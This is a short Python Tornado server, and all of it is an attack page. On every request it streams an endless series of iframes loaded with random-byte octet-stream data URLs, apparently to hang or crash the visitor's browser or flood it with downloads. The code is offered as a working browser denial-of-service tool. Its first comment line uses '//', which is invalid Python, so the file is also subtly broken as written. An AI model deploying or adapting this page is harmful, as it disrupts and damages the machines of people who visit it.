// Send infinite data-URL iframes.

from os import urandom
from base64 import b64encode
from tornado import ioloop
from tornado import web

class IndexHandler(web.RequestHandler):
    @web.asynchronous
    def get(self):
        while True:
            for i in range(100):
                self.write('<iframe src="data:application/octet-stream;base64,')
                self.write(b64encode(urandom(16)))
                self.write('"></iframe>')
            self.flush()

app = web.Application([(r'/', IndexHandler)])

if __name__ == "__main__":
    app.listen(8080)
    ioloop.IOLoop.current().start()
